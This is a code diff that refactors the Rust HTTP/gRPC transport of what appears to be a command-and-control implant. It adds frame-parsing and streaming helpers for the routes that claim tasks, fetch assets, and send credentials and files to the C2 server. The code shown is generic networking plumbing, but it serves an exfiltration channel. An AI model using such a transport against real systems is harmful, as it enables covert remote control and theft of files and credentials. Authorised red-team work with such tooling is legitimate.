@@ -7,6 +7,73 @@ use prost::Message;
 use std::sync::mpsc::{Receiver, Sender};
 use bytes::{Buf, BytesMut};
 
+/// gRPC frame header utilities for encoding/decoding wire protocol frames
+mod grpc_frame {
+    use bytes::{Buf, BytesMut};
+
+    /// Size of gRPC frame header: [compression_flag(1)][length(4)]
+    const FRAME_HEADER_SIZE: usize = 5;
+
+    #[derive(Debug, Clone, Copy)]
+    pub struct FrameHeader {
+        pub compression_flag: u8,
+        pub message_length: u32,
+    }
+
+    impl FrameHeader {
+        /// Create a new frame header with no compression
+        pub fn new(message_length: u32) -> Self {
+            Self {
+                compression_flag: 0x00,
+                message_length,
+            }
+        }
+
+        /// Encode frame header to 5-byte array
+        pub fn encode(&self) -> [u8; FRAME_HEADER_SIZE] {
+            let mut header = [0u8; FRAME_HEADER_SIZE];
+            header[0] = self.compression_flag;
+            header[1..5].copy_from_slice(&self.message_length.to_be_bytes());
+            header
+        }
+
+        /// Try to decode frame header from buffer
+        /// Returns None if buffer doesn't have enough data
+        pub fn try_decode(buffer: &BytesMut) -> Option<Self> {
+            if buffer.len() < FRAME_HEADER_SIZE {
+                return None;
+            }
+
+            let compression_flag = buffer[0];
+            let message_length = u32::from_be_bytes([buffer[1], buffer[2], buffer[3], buffer[4]]);
+
+            Some(Self {
+                compression_flag,
+                message_length,
+            })
+        }
+
+        /// Extract a complete frame from the buffer
+        /// Returns None if frame is incomplete
+        pub fn extract_frame(buffer: &mut BytesMut) -> Option<(Self, BytesMut)> {
+            let header = Self::try_decode(buffer)?;
+            let total_size = FRAME_HEADER_SIZE + header.message_length as usize;
+
+            if buffer.len() < total_size {
+                return None;
+            }
+
+            // Skip the header
+            buffer.advance(FRAME_HEADER_SIZE);
+
+            // Extract the message
+            let message = buffer.split_to(header.message_length as usize);
+
+            Some((header, message))
+        }
+    }
+}
+
 static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
 static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
 static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
@@ -41,6 +108,45 @@ pub struct HTTP {
 }
 
 impl HTTP {
+    /// Build URI from path
+    fn build_uri(&self, path: &str) -> Result<hyper::Uri> {
+        let url = format!("{}{}", self.base_url, path);
+        url.parse().context("Failed to parse URL")
+    }
+
+    /// Create a base HTTP request builder with common gRPC headers
+    fn request_builder(&self, uri: hyper::Uri) -> hyper::http::request::Builder {
+        hyper::Request::builder()
+            .method(hyper::Method::POST)
+            .uri(uri)
+            .header("Content-Type", "application/grpc")
+    }
+
+    /// Send HTTP request and validate status code
+    async fn send_and_validate(
+        &self,
+        req: hyper::Request<hyper::Body>,
+    ) -> Result<hyper::Response<hyper::Body>> {
+        let response = self
+            .client
+            .request(req)
+            .await
+            .context("Failed to send HTTP request")?;
+
+        if response.status() != StatusCode::OK {
+            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
+        }
+
+        Ok(response)
+    }
+
+    /// Read entire response body
+    async fn read_response_body(response: hyper::Response<hyper::Body>) -> Result<bytes::Bytes> {
+        hyper::body::to_bytes(response.into_body())
+            .await
+            .context("Failed to read response body")
+    }
+
     /// Generic helper method for unary RPC calls (request-response pattern).
     /// Handles marshaling, HTTP request/response, and unmarshaling for all unary operations.
     async fn unary_rpc<Req, Resp>(
@@ -52,41 +158,147 @@ impl HTTP {
         Req: Message + Send + 'static,
         Resp: Message + Default + Send + 'static,
     {
-        // Marshal: Encode and encrypt the request using the codec
+        // Marshal and encrypt the request
         let request_bytes = marshal_with_codec::<Req, Resp>(request)?;
 
-        // Build the URL
-        let url = format!("{}{}", self.base_url, path);
-        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;
-
-        // Build the HTTP request
-        let req = hyper::Request::builder()
-            .method(hyper::Method::POST)
-            .uri(uri)
-            .header("Content-Type", "application/grpc")
+        // Build and send the request
+        let uri = self.build_uri(path)?;
+        let req = self
+            .request_builder(uri)
             .body(hyper::Body::from(request_bytes))
             .context("Failed to build HTTP request")?;
 
-        // Send the request
-        let response = self
-            .client
-            .request(req)
-            .await
-            .context("Failed to send HTTP request")?;
+        let response = self.send_and_validate(req).await?;
 
-        if response.status() != StatusCode::OK {
-            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
-        }
-
-        // Read the response body
-        let body_bytes = hyper::body::to_bytes(response.into_body())
-            .await
-            .context("Failed to read response body")?;
-
-        // Unmarshal: Decrypt and decode the response using the codec
+        // Read and unmarshal the response
+        let body_bytes = Self::read_response_body(response).await?;
         let response_msg = unmarshal_with_codec::<Req, Resp>(&body_bytes)?;
 
         Ok(response_msg)
+    }
+
+    /// Stream and decode gRPC frames from HTTP response body (server-streaming pattern)
+    /// Generic over request/response types for unmarshaling
+    async fn stream_grpc_frames<Req, Resp, F>(
+        response: hyper::Response<hyper::Body>,
+        mut handler: F,
+    ) -> Result<()>
+    where
+        Req: Message + Send + 'static,
+        Resp: Message + Default + Send + 'static,
+        F: FnMut(Resp) -> Result<()>,
+    {
+        let mut body = response.into_body();
+        let mut buffer = BytesMut::new();
+        let mut message_count = 0;
+
+        loop {
+            // Process all complete frames in the buffer
+            while let Some((header, encrypted_message)) = grpc_frame::FrameHeader::extract_frame(&mut buffer) {
+                message_count += 1;
+
+                #[cfg(debug_assertions)]
+                log::debug!(
+                    "Received complete encrypted message {}: compression={}, {} bytes",
+                    message_count,
+                    header.compression_flag,
+                    encrypted_message.len()
+                );
+
+                // Unmarshal: Decrypt and decode the complete encrypted message
+                let response_msg = unmarshal_with_codec::<Req, Resp>(&encrypted_message)?;
+
+                // Handle the decoded message
+                handler(response_msg)?;
+            }
+
+            // Read more data from HTTP body
+            match body.data().await {
+                Some(Ok(chunk)) => {
+                    #[cfg(debug_assertions)]
+                    log::debug!("Received HTTP chunk: {} bytes", chunk.len());
+
+                    buffer.extend_from_slice(&chunk);
+                }
+                Some(Err(err)) => {
+                    return Err(anyhow::anyhow!("Failed to read chunk from response: {}", err));
+                }
+                None => {
+                    // No more data from HTTP
+                    break;
+                }
+            }
+        }
+
+        // Check if there's leftover data in the buffer
+        if !buffer.is_empty() {
+            #[cfg(debug_assertions)]
+            log::warn!("Incomplete data remaining in buffer: {} bytes", buffer.len());
+        }
+
+        #[cfg(debug_assertions)]
+        log::debug!("Completed streaming {} messages", message_count);
+
+        Ok(())
+    }
+
+    /// Create a streaming HTTP body that encodes requests as gRPC frames (client-streaming pattern)
+    fn create_streaming_body<Req, Resp>(receiver: Receiver<Req>) -> hyper::Body
+    where
+        Req: Message + Send + 'static,
+        Resp: Message + Default + Send + 'static,
+    {
+        let (mut tx, body) = hyper::Body::channel();
+
+        tokio::spawn(async move {
+            let mut chunk_count = 0;
+            for req_chunk in receiver {
+                chunk_count += 1;
+
+                #[cfg(debug_assertions)]
+                log::debug!("Sending chunk {}", chunk_count);
+
+                // Marshal and encrypt each chunk
+                let request_bytes = match marshal_with_codec::<Req, Resp>(req_chunk) {
+                    Ok(bytes) => bytes,
+                    Err(err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("Failed to marshal chunk {}: {}", chunk_count, err);
+                        return;
+                    }
+                };
+
+                // Create gRPC frame header
+                let frame_header = grpc_frame::FrameHeader::new(request_bytes.len() as u32);
+
+                // Send frame header
+                if tx
+                    .send_data(hyper::body::Bytes::from(frame_header.encode().to_vec()))
+                    .await
+                    .is_err()
+                {
+                    #[cfg(debug_assertions)]
+                    log::error!("Failed to send frame header for chunk {}", chunk_count);
+                    return;
+                }
+
+                // Send encrypted chunk
+                if tx
+                    .send_data(hyper::body::Bytes::from(request_bytes))
+                    .await
+                    .is_err()
+                {
+                    #[cfg(debug_assertions)]
+                    log::error!("Failed to send chunk {}", chunk_count);
+                    return;
+                }
+            }
+
+            #[cfg(debug_assertions)]
+            log::debug!("Completed sending {} chunks", chunk_count);
+        });
+
+        body
     }
 }
 
@@ -129,131 +341,28 @@ impl Transport for HTTP {
         #[cfg(debug_assertions)]
         let filename = request.name.clone();
 
-        // Marshal: Encode and encrypt the request using the codec
+        // Marshal and encrypt the request
         let request_bytes = marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request)?;
 
-        // Build the URL
-        let url = format!("{}{}", self.base_url, FETCH_ASSET_PATH);
-        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;
-
-        // Build the HTTP request
-        let req = hyper::Request::builder()
-            .method(hyper::Method::POST)
-            .uri(uri)
-            .header("Content-Type", "application/grpc")
+        // Build and send the request
+        let uri = self.build_uri(FETCH_ASSET_PATH)?;
+        let req = self
+            .request_builder(uri)
             .body(hyper::Body::from(request_bytes))
             .context("Failed to build HTTP request")?;
 
-        // Send the request
-        let response = self
-            .client
-            .request(req)
-            .await
-            .context("Failed to send HTTP request")?;
+        let response = self.send_and_validate(req).await?;
 
-        if response.status() != StatusCode::OK {
-            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
-        }
-
-        // Stream the response body and reassemble gRPC-framed messages
-        let mut body = response.into_body();
-        let mut buffer = BytesMut::new();
-        let mut message_count = 0;
-
-        loop {
-            // Try to read a complete gRPC frame from the buffer
-            while buffer.len() >= 5 {
-                // Read gRPC frame header: [compression_flag(1)][length(4)]
-                let compression_flag = buffer[0];
-                let message_length = u32::from_be_bytes([
-                    buffer[1],
-                    buffer[2],
-                    buffer[3],
-                    buffer[4],
-                ]) as usize;
-
+        // Stream the response frames
+        Self::stream_grpc_frames::<FetchAssetRequest, FetchAssetResponse, _>(response, |response_msg| {
+            tx.send(response_msg).map_err(|_err| {
                 #[cfg(debug_assertions)]
-                log::debug!(
-                    "Frame header: compression={}, length={} bytes",
-                    compression_flag,
-                    message_length
-                );
+                log::error!("Failed to send downloaded file chunk: {}: {}", filename, _err);
 
-                // Check if we have the complete message
-                if buffer.len() < 5 + message_length {
-                    // Need more data
-                    break;
-                }
-
-                // Extract the complete encrypted message
-                buffer.advance(5); // Skip frame header
-                let encrypted_message = buffer.split_to(message_length);
-                message_count += 1;
-
-                #[cfg(debug_assertions)]
-                log::debug!(
-                    "Received complete encrypted message {} for {}: {} bytes",
-                    message_count,
-                    filename,
-                    encrypted_message.len()
-                );
-
-                // Unmarshal: Decrypt and decode the complete encrypted message
-                let response_msg = unmarshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(
-                    &encrypted_message,
-                )?;
-
-                // Send the response through the channel
-                match tx.send(response_msg) {
-                    Ok(_) => {}
-                    Err(_err) => {
-                        #[cfg(debug_assertions)]
-                        log::error!(
-                            "failed to send downloaded file chunk: {}: {}",
-                            filename,
-                            _err
-                        );
-
-                        return Err(anyhow::anyhow!("Failed to send response through channel"));
-                    }
-                }
-            }
-
-            // Read more data from HTTP body
-            match body.data().await {
-                Some(Ok(chunk)) => {
-                    #[cfg(debug_assertions)]
-                    log::debug!("Received HTTP chunk: {} bytes", chunk.len());
-
-                    buffer.extend_from_slice(&chunk);
-                }
-                Some(Err(err)) => {
-                    return Err(anyhow::anyhow!("Failed to read chunk from response: {}", err));
-                }
-                None => {
-                    // No more data from HTTP
-                    break;
-                }
-            }
-        }
-
-        // Check if there's leftover data in the buffer
-        if !buffer.is_empty() {
-            #[cfg(debug_assertions)]
-            log::warn!(
-                "Incomplete data remaining in buffer: {} bytes",
-                buffer.len()
-            );
-        }
-
-        #[cfg(debug_assertions)]
-        log::debug!(
-            "Completed streaming {} messages for {}",
-            message_count,
-            filename
-        );
-
-        Ok(())
+                anyhow::anyhow!("Failed to send response through channel")
+            })
+        })
+        .await
     }
 
     async fn report_credential(
@@ -267,82 +376,20 @@ impl Transport for HTTP {
         &mut self,
         request: Receiver<ReportFileRequest>,
     ) -> Result<ReportFileResponse> {
-        // Build the URL
-        let url = format!("{}{}", self.base_url, REPORT_FILE_PATH);
-        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;
+        // Create streaming body
+        let body = Self::create_streaming_body::<ReportFileRequest, ReportFileResponse>(request);
 
-        // Create a channel to stream request chunks
-        let (mut tx, body) = hyper::Body::channel();
-
-        // Spawn a task to send all chunks
-        tokio::spawn(async move {
-            let mut chunk_count = 0;
-            for req_chunk in request {
-                chunk_count += 1;
-
-                #[cfg(debug_assertions)]
-                log::debug!("Sending file chunk {}", chunk_count);
-
-                // Marshal and encrypt each chunk
-                let request_bytes = match marshal_with_codec::<ReportFileRequest, ReportFileResponse>(req_chunk) {
-                    Ok(bytes) => bytes,
-                    Err(err) => {
-                        #[cfg(debug_assertions)]
-                        log::error!("Failed to marshal chunk {}: {}", chunk_count, err);
-                        return;
-                    }
-                };
-
-                // Write gRPC frame header: [compression_flag(1)][length(4)]
-                let mut frame_header = [0u8; 5];
-                frame_header[0] = 0x00; // No compression
-                let len_bytes = (request_bytes.len() as u32).to_be_bytes();
-                frame_header[1..5].copy_from_slice(&len_bytes);
-
-                // Send frame header
-                if tx.send_data(hyper::body::Bytes::from(frame_header.to_vec())).await.is_err() {
-                    #[cfg(debug_assertions)]
-                    log::error!("Failed to send frame header for chunk {}", chunk_count);
-                    return;
-                }
-
-                // Send encrypted chunk
-                if tx.send_data(hyper::body::Bytes::from(request_bytes)).await.is_err() {
-                    #[cfg(debug_assertions)]
-                    log::error!("Failed to send chunk {}", chunk_count);
-                    return;
-                }
-            }
-
-            #[cfg(debug_assertions)]
-            log::debug!("Completed sending {} file chunks", chunk_count);
-        });
-
-        // Build the HTTP request with streaming body
-        let req = hyper::Request::builder()
-            .method(hyper::Method::POST)
-            .uri(uri)
-            .header("Content-Type", "application/grpc")
+        // Build and send the request
+        let uri = self.build_uri(REPORT_FILE_PATH)?;
+        let req = self
+            .request_builder(uri)
             .body(body)
             .context("Failed to build HTTP request")?;
 
-        // Send the request
-        let response = self
-            .client
-            .request(req)
-            .await
-            .context("Failed to send HTTP request")?;
+        let response = self.send_and_validate(req).await?;
 
-        if response.status() != StatusCode::OK {
-            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
-        }
-
-        // Read the response body
-        let body_bytes = hyper::body::to_bytes(response.into_body())
-            .await
-            .context("Failed to read response body")?;
-
-        // Unmarshal: Decrypt and decode the response using the codec
+        // Read and unmarshal the response
+        let body_bytes = Self::read_response_body(response).await?;
         let response_msg =
             unmarshal_with_codec::<ReportFileRequest, ReportFileResponse>(&body_bytes)?;
 
